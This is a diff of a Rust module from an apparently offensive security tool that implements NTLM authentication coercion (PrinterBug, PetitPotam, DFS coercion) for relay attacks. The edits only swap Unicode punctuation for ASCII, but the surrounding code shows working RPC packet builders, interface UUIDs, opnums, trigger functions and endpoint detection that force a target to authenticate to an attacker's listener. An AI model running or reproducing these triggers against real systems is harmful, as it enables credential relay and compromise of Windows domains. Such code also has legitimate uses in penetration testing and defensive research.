@@ -3,9 +3,9 @@
 //! Implements coercion techniques that can trigger a target to authenticate
 //! to an attacker-controlled listener (e.g., for NTLM relay attacks):
 //!
-//! - MS-RPRN (Print Spooler Remote Protocol) — PrinterBug / dementor
-//! - MS-EFSR (Encrypting File System Remote Protocol) — EfsRpcOpenFileRaw / PetitPotam
-//! - MS-DFSNM (DFS Namespace Management) — DFS-RPC coercion
+//! - MS-RPRN (Print Spooler Remote Protocol) -- PrinterBug / dementor
+//! - MS-EFSR (Encrypting File System Remote Protocol) -- EfsRpcOpenFileRaw / PetitPotam
+//! - MS-DFSNM (DFS Namespace Management) -- DFS-RPC coercion
 //!
 //! These techniques work by calling RPC methods that cause the target to
 //! initiate an outbound authentication attempt to a specified UNC path.
@@ -18,9 +18,9 @@ use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tracing::{debug, info, warn};
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Types
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Optional credentials for coercion triggers.
 /// When provided, used instead of SMB null session.
@@ -46,9 +46,9 @@ pub struct CoercionResult {
     pub message: String,
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  RPC Bind Helpers
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Build DCE/RPC bind request.
 fn build_rpc_bind(interface_uuid: &[u8; 16]) -> Vec<u8> {
@@ -99,9 +99,9 @@ fn is_bind_accepted(resp: &[u8]) -> bool {
     resp.len() > 30 && resp[28] == 0 && resp[29] == 0
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  NDR Helpers
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 fn ndr_conformant_string(s: &str) -> Vec<u8> {
     let utf16: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
@@ -118,9 +118,9 @@ fn ndr_conformant_string(s: &str) -> Vec<u8> {
     out
 }
 
-// ═══════════════════════════════════════════════════════════
-//  MS-RPRN (Print Spooler) — PrinterBug
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
+//  MS-RPRN (Print Spooler) -- PrinterBug
+// ===========================================================
 
 /// MS-RPRN UUID: 12345678-1234-abcd-ef00-0123456789ab
 const RPRN_UUID: [u8; 16] = [
@@ -128,11 +128,11 @@ const RPRN_UUID: [u8; 16] = [
 ];
 
 /// RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65)
-/// This is the "PrinterBug" — causes the spooler to connect back to the caller.
+/// This is the "PrinterBug" -- causes the spooler to connect back to the caller.
 fn build_rprn_coerce(listener: &str) -> Vec<u8> {
     let mut stub = Vec::new();
 
-    // PRINTER_HANDLE (20 bytes) — null handle for coercion
+    // PRINTER_HANDLE (20 bytes) -- null handle for coercion
     stub.extend_from_slice(&[0u8; 20]);
 
     // Flags
@@ -166,7 +166,7 @@ async fn trigger_printer_bug_inner(
     listener: &str,
     creds: Option<&CoerceCreds>,
 ) -> Result<CoercionResult> {
-    info!("[Coerce] Triggering PrinterBug on {target} → {listener}");
+    info!("[Coerce] Triggering PrinterBug on {target} -> {listener}");
 
     let smb = if let Some(c) = creds {
         SmbSession::connect(target, &c.domain, &c.username, &c.password)
@@ -238,7 +238,7 @@ async fn trigger_printer_bug_inner(
     }
 }
 
-/// Trigger MS-RPRN coercion (PrinterBug) — null session variant.
+/// Trigger MS-RPRN coercion (PrinterBug) -- null session variant.
 pub async fn trigger_printer_bug(target: &str, listener: &str) -> Result<CoercionResult> {
     trigger_printer_bug_inner(target, listener, None).await
 }
@@ -252,21 +252,21 @@ pub async fn trigger_printer_bug_ex(
     trigger_printer_bug_inner(target, listener, creds).await
 }
 
-// ═══════════════════════════════════════════════════════════
-//  MS-EFSR (Encrypting File System Remote) — PetitPotam
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
+//  MS-EFSR (Encrypting File System Remote) -- PetitPotam
+// ===========================================================
 
 /// MS-EFSR UUID: df1941c5-fe89-4e79-bf10-463657acf44d
 const EFSR_UUID: [u8; 16] = [
     0xc5, 0x41, 0x19, 0xdf, 0x89, 0xfe, 0x79, 0x4e, 0xbf, 0x10, 0x46, 0x36, 0x57, 0xac, 0xf4, 0x4d,
 ];
 
-/// EfsRpcOpenFileRaw (opnum 0) — PetitPotam variant
+/// EfsRpcOpenFileRaw (opnum 0) -- PetitPotam variant
 /// Causes the target to authenticate to the specified UNC path.
 fn build_efsr_open_file_raw(listener: &str) -> Vec<u8> {
     let mut stub = Vec::new();
 
-    // Handle (20 bytes) — null
+    // Handle (20 bytes) -- null
     stub.extend_from_slice(&[0u8; 20]);
 
     // FileName (pointer to UNC path)
@@ -281,7 +281,7 @@ fn build_efsr_open_file_raw(listener: &str) -> Vec<u8> {
     build_rpc_request(0, &stub)
 }
 
-/// EfsRpcEncryptFileSrv (opnum 4) — alternative PetitPotam variant
+/// EfsRpcEncryptFileSrv (opnum 4) -- alternative PetitPotam variant
 fn build_efsr_encrypt_file(listener: &str) -> Vec<u8> {
     let mut stub = Vec::new();
 
@@ -301,7 +301,7 @@ async fn trigger_petitpotam_inner(
     listener: &str,
     creds: Option<&CoerceCreds>,
 ) -> Result<CoercionResult> {
-    info!("[Coerce] Triggering PetitPotam on {target} → {listener}");
+    info!("[Coerce] Triggering PetitPotam on {target} -> {listener}");
 
     let smb = if let Some(c) = creds {
         SmbSession::connect(target, &c.domain, &c.username, &c.password)
@@ -341,7 +341,7 @@ async fn trigger_petitpotam_inner(
             };
 
             // STATUS_ACCESS_DENIED (0xC0000022) means the coercion worked
-            // but auth failed — this is expected when the listener doesn't have valid creds
+            // but auth failed -- this is expected when the listener doesn't have valid creds
             let success = status == 0xC0000022
                 || status == 0xC000009A // STATUS_INSUFFICIENT_RESOURCES
                 || status == 0;
@@ -393,16 +393,16 @@ async fn trigger_petitpotam_inner(
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  MS-DFSNM (DFS Namespace Management)
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// MS-DFSNM UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
 const DFSNM_UUID: [u8; 16] = [
     0xe0, 0x42, 0xc7, 0x4f, 0x10, 0x4a, 0xcf, 0x11, 0x82, 0x73, 0x00, 0xaa, 0x00, 0x4a, 0xe6, 0x73,
 ];
 
-/// NetrDfsRemoveStdRoot (opnum 14) — DFS coercion
+/// NetrDfsRemoveStdRoot (opnum 14) -- DFS coercion
 fn build_dfs_coerce(listener: &str) -> Vec<u8> {
     let mut stub = Vec::new();
 
@@ -420,7 +420,7 @@ fn build_dfs_coerce(listener: &str) -> Vec<u8> {
     build_rpc_request(14, &stub)
 }
 
-/// Trigger MS-EFSR coercion (PetitPotam) — null session variant.
+/// Trigger MS-EFSR coercion (PetitPotam) -- null session variant.
 pub async fn trigger_petitpotam(target: &str, listener: &str) -> Result<CoercionResult> {
     trigger_petitpotam_inner(target, listener, None).await
 }
@@ -439,7 +439,7 @@ async fn trigger_dfs_coerce_inner(
     listener: &str,
     creds: Option<&CoerceCreds>,
 ) -> Result<CoercionResult> {
-    info!("[Coerce] Triggering DFS coercion on {target} → {listener}");
+    info!("[Coerce] Triggering DFS coercion on {target} -> {listener}");
 
     let smb = if let Some(c) = creds {
         SmbSession::connect(target, &c.domain, &c.username, &c.password)
@@ -494,7 +494,7 @@ async fn trigger_dfs_coerce_inner(
     }
 }
 
-/// Trigger MS-DFSNM coercion — null session variant.
+/// Trigger MS-DFSNM coercion -- null session variant.
 pub async fn trigger_dfs_coerce(target: &str, listener: &str) -> Result<CoercionResult> {
     trigger_dfs_coerce_inner(target, listener, None).await
 }
@@ -508,9 +508,9 @@ pub async fn trigger_dfs_coerce_ex(
     trigger_dfs_coerce_inner(target, listener, creds).await
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Coercion Endpoint Detection
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Detect available coercion endpoints on a target.
 /// Checks for MS-RPRN, MS-EFSR, and DFS-RPC interfaces via null session.
@@ -534,7 +534,7 @@ pub async fn detect_coercion_endpoints(target: &str) -> Result<Vec<CoercionResul
         return Ok(results);
     }
 
-    // MS-RPRN (Print Spooler) — interface: 12345678-1234-ABCD-EF00-0123456789AB
+    // MS-RPRN (Print Spooler) -- interface: 12345678-1234-ABCD-EF00-0123456789AB
     let rprn_uuid: [u8; 16] = [
         0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89,
         0xab,
@@ -562,7 +562,7 @@ pub async fn detect_coercion_endpoints(target: &str) -> Result<Vec<CoercionResul
         },
     );
 
-    // MS-EFSR (Encrypting File System) — interface: df1941c5-fe89-4e79-bf10-463657acf44d
+    // MS-EFSR (Encrypting File System) -- interface: df1941c5-fe89-4e79-bf10-463657acf44d
     let efsr_uuid: [u8; 16] = [
         0xc5, 0x41, 0x19, 0xdf, 0x89, 0xfe, 0x79, 0x4e, 0xbf, 0x10, 0x46, 0x36, 0x57, 0xac, 0xf4,
         0x4d,
@@ -590,7 +590,7 @@ pub async fn detect_coercion_endpoints(target: &str) -> Result<Vec<CoercionResul
         },
     );
 
-    // DFS-RPC (DFS Namespace Management) — interface: 4fc742e0-4a10-11cf-8273-00aa004ae673
+    // DFS-RPC (DFS Namespace Management) -- interface: 4fc742e0-4a10-11cf-8273-00aa004ae673
     let dfs_uuid: [u8; 16] = [
         0xe0, 0x42, 0xc7, 0x4f, 0x10, 0x4a, 0xcf, 0x11, 0x82, 0x73, 0x00, 0xaa, 0x00, 0x4a, 0xe6,
         0x73,
@@ -638,7 +638,7 @@ async fn check_rpc_interface(
         _ => "\\srvsvc",
     };
 
-    // Try to open the pipe via transact — if it succeeds, the interface is available
+    // Try to open the pipe via transact -- if it succeeds, the interface is available
     match smb.pipe_transact(pipe_name, &[]).await {
         Ok(_) => {
             debug!("[coerce] {protocol_name} interface accessible");
@@ -651,16 +651,16 @@ async fn check_rpc_interface(
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  TCP-based Coercion (Fallback via EPM Port 135)
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Coercion protocol selection for TCP transport.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 pub enum CoerceProtocol {
-    /// MS-EFSRPC (Encrypting File System Remote) — PetitPotam
+    /// MS-EFSRPC (Encrypting File System Remote) -- PetitPotam
     EfsRpc,
-    /// MS-RPRN (Print Spooler Remote) — PrinterBug
+    /// MS-RPRN (Print Spooler Remote) -- PrinterBug
     Rprn,
     /// MS-DFSNM (DFS Namespace Management)
     EfsBackup,
@@ -847,7 +847,7 @@ async fn send_tcp_coerce(
     })
 }
 
-// ── TCP stub builders ──
+// -- TCP stub builders --
 
 fn build_efsr_open_file_raw_tcp(listener: &str) -> Vec<u8> {
     let mut stub = Vec::new();
@@ -906,9 +906,9 @@ pub async fn trigger_coerce_tcp(
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Tests
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 #[cfg(test)]
 mod tests {
@@ -936,7 +936,7 @@ mod tests {
         assert!(encoded.windows(2).any(|w| w == [b'\\', 0]));
     }
 
-    // ── TCP coercion tests ──
+    // -- TCP coercion tests --
 
     #[test]
     fn test_coerce_protocol_uuids() {
